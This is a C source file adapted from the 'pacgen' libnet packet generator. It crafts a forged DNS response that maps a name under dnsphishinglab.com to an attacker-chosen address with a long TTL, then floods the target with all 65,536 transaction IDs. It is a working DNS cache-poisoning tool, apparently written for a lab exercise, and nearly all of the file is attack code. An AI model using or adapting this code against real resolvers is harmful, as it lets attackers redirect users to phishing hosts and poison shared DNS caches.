/*		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991

 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/

#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>

    int c;
    //u_char *cp;
    libnet_t *l;
    //libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    
    char eth_file[FILENAME_MAX] = "";
    char ip_file[FILENAME_MAX] = "";
    char tcp_file[FILENAME_MAX] = "";
    char payload_file[FILENAME_MAX] = "";
    char payload_location[256] = {'\0'};
    
    //int x;
    //int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    //int z;
    //int i;
    int payload_filesize = 0;
    int payload_buff_size = 256;
    u_int payload_size	= 0;

    //int dnspacket_size	= 0;

    int t_src_port;		/* TCP source port */
    int t_des_port;		/* TCP dest port */
    int t_win;		/* TCP window size */
    int t_urgent;		/* TCP urgent data pointer */
    int i_id;		/* IP id */
    int i_frag;		/* IP frag */
    u_short head_type;          /* TCP or UDP */

    u_long t_ack;		/* TCP ack number */
    u_long t_seq;		/* TCP sequence number */
    u_long i_des_addr;		/* IP dest addr */
    u_long i_src_addr;		/* IP source addr */

    u_char i_ttos[90];		/* IP TOS string */
    u_char t_control[65];	/* TCP control string */

    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    int eth_pktcount;        /* How many packets to send */
    int nap_time;              /* How long to sleep */

    u_char ip_proto[40];

    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};

    //u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char t_control_val = 0;	/* final or'd value for tcp control */
    int i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */

int main(int argc, char *argv[])
{
    /*
     *  Initialize the library.  Root priviledges are required.
     */
	libnet_ptag_t udp = 0, ip = 0, linklayer = 0;
    l = libnet_init(
           LIBNET_LINK,                             /* injection type */
		/*LIBNET_RAW4,*/
/*            NULL, */                                   /* network interface eth0, eth1, etc. NULL is default.*/
	    "eth15",                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */

    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
/*  src_ip  = 0;
    dst_ip  = 0;
    src_prt = 0;
    dst_prt = 0;
    payload_location = NULL;
    payload_s = 0;
*/
    while ((c = getopt (argc, argv, "p:t:i:e:")) != EOF)
    {
        switch (c)
        {
            case 'p':
                strcpy(payload_file, optarg);
                break;
            case 't':
                strcpy(tcp_file, optarg);
                break;
            case 'i':
                strcpy(ip_file, optarg);
                break;
            case 'e':
                strcpy(eth_file, optarg);
                break;
            default:
                break;
        }
    }

    if (optind != 9)
    {    
        usage();
        exit(0);
    }
    load_ethernet();
    load_tcp_udp();
    load_ip();
    convert_proto();
    load_payload();
/*    Testing tcp header options

        t = libnet_build_tcp_options(
        "\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000",
        20,
        l,
        0);
    if (t == -1)
    {
        fprintf(stderr, "Can't build TCP options: %s\n", libnet_geterror(l));
        goto bad;
    }
*/
/*
if (nap_time >= 0)
	printf("You have chosen to send %d packets every %d seconds. \nYou will need to press CTRL-C to halt this process.\n", eth_pktcount, nap_time);

if (nap_time == -1)
	printf("You have chose to send %d packets and quit.\n",eth_pktcount);
*/
u_short dns_tranx_id;
int counter;
for(dns_tranx_id=0, counter=0; counter <= 65535 ; counter++, dns_tranx_id++)  /* Send 65535 packets each with different tranx ID in increasing order. :-) */
{
    unsigned char higher8_bits = (unsigned char)(dns_tranx_id>>8);
    unsigned char lower8_bits = 0x00FF&dns_tranx_id;
    memcpy(payload_location, &higher8_bits, 1);
    memcpy(payload_location + 1, &lower8_bits,1);
    libnet_t *temp_l = l; 	

if(ip_proto_val==IPPROTO_TCP){    
    udp = libnet_build_tcp(
        t_src_port,                                    /* source port */
        t_des_port,                                    /* destination port */
        t_seq,                                         /* sequence number */
        t_ack,                                         /* acknowledgement num */
        t_control_val,                                 /* control flags */
        t_win,                                         /* window size */
        0,                                             /* checksum */
        t_urgent,                                      /* urgent pointer */
        LIBNET_TCP_H + payload_filesize,               /* TCP packet size */
	payload_location,                              /* payload_location */
        payload_filesize,                              /* payload_location size */
        l,                                             /* libnet handle */
        udp);                                            /* libnet id */
    head_type = LIBNET_TCP_H;
    if (udp == -1)
    {
        fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
        goto bad;
    }
}
 
if(ip_proto_val==IPPROTO_UDP){
        udp = libnet_build_udp(
	    t_src_port,                                /* source port */
	    t_des_port,                                /* destination port */
	    LIBNET_UDP_H + payload_size,           /* packet length */
	    0,                                         /* checksum */
	    payload_location,                          /* payload_location */
	    payload_size,                          /* payload_location size */
	    l,                                         /* libnet handle */
	    udp);                                        /* libnet id */
    head_type = LIBNET_UDP_H;
    if (udp == -1)
    {
        fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
        goto bad;
    }
}

    //fprintf(stdout,"\t Payload content : \"%s\"\n\t size : %d\n", payload_location, payload_size);
    //int writtensize = fwrite(payload_location,sizeof(char), payload_size, stdout);
    //printf("\n total written size ");
    ip = libnet_build_ipv4(
/*        LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,          length */
        LIBNET_IPV4_H + head_type + payload_size,          /* length */
	i_ttos_val,                                            /* TOS */
        i_id,                                                  /* IP ID */
        i_frag,                                                /* IP Frag */
        i_ttl,                                                 /* TTL */
        ip_proto_val,                                          /* protocol */
        0,                                                     /* checksum */
        i_src_addr,                                            /* source IP */
        i_des_addr,                                            /* destination IP */
        NULL,                                                  /* payload_location */
        0,                                                     /* payload_location size */
        l,                                                     /* libnet handle */
        ip);                                                    /* libnet id */
    if (ip == -1)
    {
        fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
        goto bad;
    }

    linklayer = libnet_build_ethernet(
        eth_daddr,                                   /* ethernet destination */
        eth_saddr,                                   /* ethernet source */
        e_proto_val,                                 /* protocol type */
        NULL,                                        /* payload_location */
        0,                                           /* payload_location size */
        l,                                           /* libnet handle */
        linklayer);                                          /* libnet id */
    if (linklayer == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
        goto bad;
    }
     /*	
     *  Write it to the wire.
     */
	
  // for(x=0;x < eth_pktcount;x++) /* Nested packet count loop */
  //   {
     c = libnet_write(temp_l);
	if ( c == -1 ) {
		fprintf(stderr, "Error in writing the packet");
	}
   //  }
	/*
     if (nap_time == -1){
	     y=999;
	     nap_time = 0;
      }
	*/
     //sleep(0);         /*Pause of this many seconds then loop again*/
     //z=1;
}

	printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",counter,c);  /* tell them what we just did */

    /* give the buf memory back */

    libnet_destroy(l);
    return 0;
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
	    
}

usage()
{
    fprintf(stderr, "pacgen 1.10 by Bo Cato. Protected under GPL.\nusage: pacgen -p <payload_location file> -t <TCP/UDP file> -i <IP file> -e <Ethernet file>\n");
}

    /* load_payload: load the payload_location into memory */
load_payload()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int c = 0;

	/* dns packet	*/
	// Header section
	u_short dns_tranx_id = 0;
	u_short dns_flags 	= 0x8080;
	u_short dns_qdcount = 0x0100;
	u_short dns_ancount = 0x0200;
	u_short dns_nscount = 0;
	u_short dns_arcount = 0x0100;
	
	// Question section
	char qname[] 				= {0x03,'f','b','c',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
												'l','a','b',0x03,'c','o','m',0x00,'\0'}; // query host name
	int qname_len			= 24;
	u_short qtype 			= 0x0100; //A (host address) in hex representation
	u_short qclass 			= 0x0100; // IN in decimal representation

	//RR ans 1 	
	char ans1_name[] 			= {0x03,'f','b','c',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
												'l','a','b',0x03,'c','o','m',0x00,'\0'} ; // ans host name
	int ans1_name_len		= 24;
	u_short ans1_type 		= 0x0500; // cname
	u_short ans1_class 		= 0x0100; // IN
	u_int ans1_ttl 			= 0x3d000000; //don't cache (usually time period in seconds)
	u_short ans1_rdlength	= 0x1800; // length of rdata
	int ans1_rdata_len		= 24;
	char ans1_rdata[]			= {0x03,'w','w','w',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
                                                'l','a','b',0x03,'c','o','m',0x00,'\0'};
	//RR ans 2	
	char ans2_name[]	 		= {0x03,'w','w','w',0x0e,'d','n','s','p','h','i','s','h','i','n','g',
                                                'l','a','b',0x03,'c','o','m',0x00,'\0'};
	int ans2_name_len		= 24;
	u_short ans2_type 		= 0x0100; // A (host address)
	u_short ans2_class		= 0x0100;	// IN
	u_int ans2_ttl			= 0x3d000000; //don't cache (caching duration in second) 
	u_short ans2_rdlength	= 0x0400; // length of data
	int ans2_rdata_len		= 4;
	char ans2_rdata[5]		= {0x01, 0x02, 0x03, 0x08, 0x00}; //RR data field

	//additional RR pertaining to edns
	char ar_root_name		=0x00;
	u_short ar_type			=0x2900; // record type is OPT 41
	u_short ar_class		=0x0010; // class is used to represent UDP payload size 4096
	u_int ar_ttl			=0x00800000; // TTL is used as fill extended rcode and flags
	u_short ar_rdata_len		=0x0000;

    /* get the file size so we can figure out how much memory to allocate */
 
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size;

    //payload_location = (char *)malloc(payload_filesize * sizeof(char));
    //payload_location = (char *)calloc(1,payload_buff_size * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload_location failed.\n");
        exit(0); 
    }

    /* open the file and read it into memory */
	
    //infile = fopen(payload_file, "r");	/* open the payload_location file read only */
    /*
    while((c = getc(infile)) != EOF)
    {
        *(payload_location + i) = c;
        i++;
    }

    fclose(infile);
	*/
	
	/*	load the dns packet content in payload_location buffer and keep track of size */
	memset(payload_location,0,payload_buff_size); //clear out the buffer
	// leave 16 bit(2 octet) empty space for transaction ID
	
	//add size for transaction ID 
	payload_size += 2;
	// copy 16 bit flag(2 octet)
	memcpy(payload_location + payload_size, &dns_flags,2);
	payload_size += 2;
	// copy qdcount
	memcpy(payload_location + payload_size, &dns_qdcount, 2);
	payload_size += 2;
	// copy ancount
    memcpy(payload_location + payload_size, &dns_ancount, 2);
    payload_size += 2;
    // copy nscount
    memcpy(payload_location + payload_size, &dns_nscount, 2);
    payload_size += 2;
    // copy arcount
    memcpy(payload_location + payload_size, &dns_arcount, 2);
    payload_size += 2;

	// Question section
    // copy qname
    memcpy(payload_location + payload_size, qname, qname_len);
    payload_size += qname_len;
    // copy qtype
    memcpy(payload_location + payload_size, &qtype, 2);
    payload_size += 2;
    // copy qclass
    memcpy(payload_location + payload_size, &qclass, 2);
    payload_size += 2;
	
	/* RR(Resouce Record) section */
    /* copy ans1 */
	// copy name
    memcpy(payload_location + payload_size, ans1_name, ans1_name_len);
    payload_size += ans1_name_len;
    // copy type
    memcpy(payload_location + payload_size, &ans1_type, 2);
    payload_size += 2;
    // copy class
    memcpy(payload_location + payload_size, &ans1_class, 2);
    payload_size += 2;
    // copy TTL
    memcpy(payload_location + payload_size, &ans1_ttl, 4);
    payload_size += 4;
    // copy RDLENGTH
    memcpy(payload_location + payload_size, &ans1_rdlength, 2);
    payload_size += 2;
    // copy RDATA
    memcpy(payload_location + payload_size, ans1_rdata, ans1_rdata_len);
    payload_size += ans1_rdata_len;

	/* copy ans2 */
	// copy name
    memcpy(payload_location + payload_size, ans2_name, ans2_name_len);
    payload_size += ans2_name_len;
    // copy type
    memcpy(payload_location + payload_size, &ans2_type, 2);
    payload_size += 2;
    // copy class
    memcpy(payload_location + payload_size, &ans2_class, 2);
    payload_size += 2;
    // copy TTL
    memcpy(payload_location + payload_size, &ans2_ttl, 4);
    payload_size += 4;
    // copy RDLENGTH
    memcpy(payload_location + payload_size, &ans2_rdlength, 2);
    payload_size += 2;
    // copy RDATA
    memcpy(payload_location + payload_size, ans2_rdata, ans2_rdata_len);
    payload_size += ans2_rdata_len;

    /* EDNS */
    memcpy(payload_location + payload_size, &ar_root_name, 1);
    payload_size += 1;
    memcpy(payload_location + payload_size, &ar_type, 2);
    payload_size += 2;
    memcpy(payload_location + payload_size, &ar_class, 2);
    payload_size += 2;
    memcpy(payload_location + payload_size, &ar_ttl, 4);
    payload_size += 4;
    memcpy(payload_location + payload_size, &ar_rdata_len, 2);
    payload_size += 2;
}

    /* load_ethernet: load ethernet data file into the variables */
load_ethernet()
{
    FILE *infile;

    char s_read[40];
    char d_read[40];
    char p_read[60];
    char count_line[40];

    infile = fopen(eth_file, "r");

    fgets(s_read, 40, infile);         /*read the source mac*/
    fgets(d_read, 40, infile);         /*read the destination mac*/
    fgets(p_read, 60, infile);         /*read the desired protocal*/
    fgets(count_line, 40, infile);     /*read how many packets to send*/

    sscanf(s_read, "saddr,%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    sscanf(d_read, "daddr,%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    sscanf(p_read, "proto,%s", &eth_proto);
    sscanf(count_line, "pktcount,%d", &eth_pktcount);

    fclose(infile);
}

    /* load_tcp_udp: load TCP or UDP data file into the variables */
load_tcp_udp()
{
    FILE *infile;

    char sport_line[20] = "";
    char dport_line[20] = "";
    char seq_line[20] = "";
    char ack_line[20] = "";
    char control_line[65] = "";
    char win_line[20] = "";
    char urg_line[20] = "";

    infile = fopen(tcp_file, "r");

    fgets(sport_line, 15, infile);	/*read the source port*/
    fgets(dport_line, 15, infile); 	/*read the dest port*/
    fgets(win_line, 12, infile);	/*read the win num*/
    fgets(urg_line, 12, infile);	/*read the urg id*/
    fgets(seq_line, 13, infile);	/*read the seq num*/
    fgets(ack_line, 13, infile);	/*read the ack id*/
    fgets(control_line, 63, infile);	/*read the control flags*/

    /* parse the strings and throw the values into the variable */

    sscanf(sport_line, "sport,%d", &t_src_port);
    sscanf(sport_line, "sport,%d", &udp_src_port);
    sscanf(dport_line, "dport,%d", &t_des_port);
    sscanf(dport_line, "dport,%d", &udp_des_port);
    sscanf(win_line, "win,%d", &t_win);
    sscanf(urg_line, "urg,%d", &t_urgent);
    sscanf(seq_line, "seq,%ld", &t_seq);
    sscanf(ack_line, "ack,%ld", &t_ack);
    sscanf(control_line, "control,%[^!]", &t_control);

    fclose(infile); /*close the file*/
}

    /* load_ip: load IP data file into memory */
load_ip()
{
    FILE *infile;

    char proto_line[40] = "";
    char id_line[40] = "";
    char frag_line[40] = "";
    char ttl_line[40] = "";
    char saddr_line[40] = "";
    char daddr_line[40] = "";
    char tos_line[90] = "";
    char z_zsaddr[40] = "";
    char z_zdaddr[40] = "";
    char inter_line[15]="";

    infile = fopen(ip_file, "r");

    fgets(id_line, 11, infile);		/* this stuff should be obvious if you read the above subroutine */
    fgets(frag_line, 13, infile);	/* see RFC 791 for details */
    fgets(ttl_line, 10, infile);
    fgets(saddr_line, 24, infile);
    fgets(daddr_line, 24, infile);
    fgets(proto_line, 40, infile);
    fgets(inter_line, 15, infile);
    fgets(tos_line, 78, infile);
    
    sscanf(id_line, "id,%d", &i_id);
    //i_id = getpid();
    sscanf(frag_line, "frag,%d", &i_frag);
    sscanf(ttl_line, "ttl,%d", &i_ttl);
    sscanf(saddr_line, "saddr,%s", &z_zsaddr);
    sscanf(daddr_line, "daddr,%s", &z_zdaddr);
    sscanf(proto_line, "proto,%s", &ip_proto);
    sscanf(inter_line, "interval,%d", &nap_time);
    sscanf(tos_line, "tos,%[^!]", &i_ttos);

    i_src_addr = libnet_name2addr4(l, z_zsaddr, LIBNET_RESOLVE);
    i_des_addr = libnet_name2addr4(l, z_zdaddr, LIBNET_RESOLVE);
    
    fclose(infile);
}

convert_proto()
{

/* Need to add more Ethernet and IP protocals to choose from */

	if(strstr(eth_proto, "arp") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_ARP;

	if(strstr(eth_proto, "ip") != NULL)
	  e_proto_val = e_proto_val | ETHERTYPE_IP;

	if(strstr(ip_proto, "tcp") != NULL)
        ip_proto_val = ip_proto_val | IPPROTO_TCP;

	if(strstr(ip_proto, "udp") != NULL)
	  ip_proto_val = ip_proto_val | IPPROTO_UDP;
}

    /* convert_toscontrol:  or flags in strings to make u_chars */
convert_toscontrol()
{
    if(strstr(t_control, "th_urg") != NULL)
        t_control_val = t_control_val | TH_URG;

    if(strstr(t_control, "th_ack") != NULL)
        t_control_val = t_control_val | TH_ACK;

    if(strstr(t_control, "th_psh") != NULL)
        t_control_val = t_control_val | TH_PUSH;

    if(strstr(t_control, "th_rst") != NULL)
        t_control_val = t_control_val | TH_RST;

    if(strstr(t_control, "th_syn") != NULL)
        t_control_val = t_control_val | TH_SYN;

    if(strstr(t_control, "th_fin") != NULL)
        t_control_val = t_control_val | TH_FIN;

    if(strstr(i_ttos, "iptos_lowdelay") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_LOWDELAY;

    if(strstr(i_ttos, "iptos_throughput") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_THROUGHPUT;

    if(strstr(i_ttos, "iptos_reliability") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_RELIABILITY;

    if(strstr(i_ttos, "iptos_mincost") != NULL)
        i_ttos_val = i_ttos_val | IPTOS_MINCOST;
}

/* EOF */
